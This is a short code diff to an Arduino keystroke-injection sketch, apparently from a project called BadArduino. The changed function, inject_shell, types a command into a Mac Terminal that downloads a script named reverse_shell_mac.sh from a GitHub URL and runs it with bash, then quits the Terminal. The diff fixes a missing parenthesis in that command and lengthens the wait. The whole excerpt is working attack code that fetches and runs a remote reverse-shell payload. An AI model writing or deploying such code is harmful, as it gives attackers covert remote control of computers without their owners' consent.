@@ -129,9 +129,9 @@ void inject_shell(){
       Keyboard.write(KEY_RETURN);
       delay(100);
       // In the Terminal run a command
-      Keyboard.print("bash <(curl -s https://raw.githubusercontent.com/peterapps/BadArduino/master/client_scripts/reverse_shell_mac.sh");
+      Keyboard.print("bash <(curl -s https://raw.githubusercontent.com/peterapps/BadArduino/master/client_scripts/reverse_shell_mac.sh)");
       Keyboard.write(KEY_RETURN);
-      delay(1000); // TODO: Figure out how long it will take to install the script
+      delay(5000); // TODO: Figure out how long it will take to install the script
       // Quit the Terminal
       Keyboard.press(KEY_LEFT_GUI);
       Keyboard.press('q');
